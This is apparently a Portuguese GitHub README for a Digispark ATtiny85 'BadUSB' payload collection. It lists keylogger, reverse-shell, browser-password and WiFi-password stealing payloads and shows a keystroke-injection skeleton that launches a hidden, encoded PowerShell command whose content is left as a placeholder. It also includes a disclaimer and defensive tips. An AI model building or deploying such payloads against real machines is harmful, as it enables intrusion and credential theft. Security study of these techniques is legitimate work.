<div width="100%" align="center">
  <img alt="Digispark ATtiny85" height="120" width="120" src="https://brandslogos.com/wp-content/uploads/images/large/arduino-logo-1.png" />
  <h1>Digispark ATtiny85 - Pendrive Hacker</h1>
  <p><strong>Coleção de Payloads para Testes de Segurança e Estudos Ofensivos</strong></p>
  <p>
    <img alt="C++" src="https://img.shields.io/badge/C++-84.4%25-blue" />
    <img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-15.6%25-blue" />
    <img alt="License" src="https://img.shields.io/badge/License-MIT-green" />
  </p>
</div>

---

## ⚠️ Aviso Legal

> **Este repositório é exclusivamente para fins educacionais e testes de segurança autorizados.**
> 
> O uso não autorizado destes payloads em sistemas sem permissão explícita é **ilegal** e viola leis de proteção de dados e segurança cibernética. O autor não se responsabiliza pelo uso indevido das informações aqui contidas.
> 
> **Sempre obtenha autorização por escrito antes de realizar qualquer teste em sistemas que não sejam de sua propriedade.**

---

## 🎯 Sobre o Projeto

Este repositório contém uma coleção de payloads para o **Digispark ATtiny85** (um microcontrolador que se apresenta como um dispositivo USB HID), permitindo a execução automatizada de comandos ao ser conectado a um computador. Ideal para:

- Estudos de segurança ofensiva e testes de penetração
- Demonstração de vetores de ataque via dispositivos USB
- Compreensão de técnicas de automação HID
- Desenvolvimento de contramedidas e hardening de sistemas

---

## 📦 Payloads Disponíveis

| Payload | Descrição | Arquivo |
|---------|-----------|---------|
| **Talker** | Simula digitação de mensagens pré-definidas | [`Talker.ino`](./payloads/Talker.ino) |
| **Keylogger** | Captura e armazena pressionamentos de teclas | [`Keylogger.ino`](./payloads/Keylogger.ino) |
| **Reverse Shell** | Abre uma conexão shell reversa para controle remoto | [`ReverseShell.ino`](./payloads/ReverseShell.ino) |
| **Wallpaper Injection** | Altera o wallpaper do sistema alvo | [`WallpaperInjection.ino`](./payloads/WallpaperInjection.ino) |
| **GetBrowserPasswords** | Extrai senhas armazenadas em navegadores | [`GetBrowserPasswords.ino`](./payloads/GetBrowserPasswords.ino) |
| **GetWIFIPasswords** | Coleta senhas de redes WiFi salvas no sistema | [`GetWIFIPasswords.ino`](./payloads/GetWIFIPasswords.ino) |

---

## ⌨️ Suporte a Layouts de Teclado

### 🇺🇸 Teclado Americano (Default)

```cpp
#include "DigiKeyboard.h"

// Exemplo: Abrir executar (Win + R)
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
```

### 🇧🇷 Teclado Brasileiro (ABNT2)

```cpp
#include <DigiKeyboardPtBr.h>

// Exemplo: Abrir executar (Win + R)
DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
```

---

## 📚 Documentação de Referência

| Documentação | Descrição |
|--------------|-----------|
| [🔑 Códigos de Teclas](./DigisparkKeys/Keys.md) | Tabela completa de keycodes e modificadores |
| [🖱️ Funções do Mouse](./DigisparkKeys/MouseFunctionality.md) | Guia para emulação de mouse |

---

## 🚀 Exemplo de Payload (Reverse Shell)

```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  
  // Abre o executar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Comando PowerShell para reverse shell
  DigiKeyboard.print("powershell -window hidden -enc <BASE64>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Esconde a janela do PowerShell
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

---

## 🛠️ Configuração do Ambiente

### Pré-requisitos

1. **Arduino IDE** (versão 1.8.13 ou superior)
2. **Placa Digispark ATtiny85** (ou compatível)

### ⚠ Configuração do Hardware
* **Microcontrolador**	ATtiny85
* **Placa	Digispark** (ou compatível)
* **Conexão	USB** direto
* **limentação**	5V via USB


### Instalação do Suporte à Placa

1. Abra a Arduino IDE
2. **Arquivo > Preferências**
3. Adicione a URL abaixo em "URLs Adicionais para Gerenciador de Placas":
   ```
   http://digistump.com/package_digistump_index.json
   ```
4. **Ferramentas > Placa > Gerenciador de Placas**
5. Pesquise por "Digistump" e instale
6. Selecione **Digispark (Default - 16.5MHz)**

### Bibliotecas Necessárias

| Biblioteca | Instalação |
|------------|------------|
| **DigiKeyboard** | Já inclusa no pacote da placa Digispark |
| **DigiKeyboardPtBr** | Disponível neste repositório ([baixar](./DigiKeyboardPtBr.h)) |

---

## 📤 Upload do Payload

1. Conecte o Digispark ao computador
2. Selecione a placa e porta corretas na IDE
3. Clique em **Upload** (ou pressione `Ctrl+U`)
4. **Importante:** Aguarde a mensagem "Plug the Digispark" e **desconecte e reconecte** a placa dentro de 60 segundos
5. Após o upload, o payload será executado automaticamente

---

## 🛡️ Medidas de Proteção

Para se proteger contra ataques do tipo "BadUSB" (como os simulados neste repositório):

- 🔒 **Bloqueie portas USB não autorizadas** em ambientes corporativos
- 🖥️ **Desabilite a execução automática** de dispositivos HID
- 🔐 **Utilize soluções de Endpoint Protection** com detecção de dispositivos USB
- 👥 **Eduque usuários** sobre riscos de conectar dispositivos desconhecidos
- 🧪 **Teste regularmente** seus sistemas com ferramentas como estas

---

## 📄 Licença

Este projeto está sob a licença MIT. Consulte o arquivo [LICENSE](LICENSE) para mais informações.

---

## 👥 Contribuições

Contribuições são bem-vindas! Para adicionar novos payloads ou melhorias:

1. Faça um fork do projeto
2. Crie uma branch para sua feature (`git checkout -b feature/nova-feature`)
3. Commit suas alterações (`git commit -m 'Adiciona nova feature'`)
4. Push para a branch (`git push origin feature/nova-feature`)
5. Abra um Pull Request

---

<div align="center">
  <sub>⚠️ <strong>Para fins educacionais e testes autorizados apenas</strong> ⚠️</sub>
  <br/>
  <sub>Feito com ❤️ para a comunidade de segurança ofensiva</sub>
  <br/>
  <img width="350px" src="https://farm5.staticflickr.com/4675/39218636535_d43a6c4fb2_o_d.png">
</div>
